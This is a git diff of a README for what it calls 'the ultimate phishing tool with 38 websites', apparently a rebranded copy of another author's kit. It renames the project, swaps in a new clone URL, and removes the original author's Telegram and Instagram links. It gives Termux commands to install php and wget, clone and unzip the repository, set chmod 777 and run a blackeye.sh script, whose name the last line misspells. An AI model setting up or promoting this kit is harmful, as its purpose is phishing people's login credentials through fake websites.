@@ -1,4 +1,4 @@
-# sadam-alsharabi
+# moody mhdi
 
 The ultimate phishing tool with 38 websites available!
 
@@ -12,22 +12,15 @@ pkg install php -y
 
 pkg install wget -y
 
-git clone https://github.com/sadamshr3be/sadam-alsharabi
+git clone https://github.com/moody/moody-horror
 
-cd sadam-alsharabi
+cd moody-horror 
 
-unzip sadamalsharabi.zip
+unzip moodyhorror.zip
 
-rm -rif sadamalsharabi.zip
+rm -rif moodyhorror.zip
 
 chmod 777 blackeye.sh
 
 bash backeye.sh
-
-قناتي علـّۓ. التلجرام.
-https://t.me/termuxalsharabi
-
-حسابي علـّۓ. الانستجرام
-
-https://instagram.com/sadam_alsharabi?igshid=1wlndj3lf8pdm
 
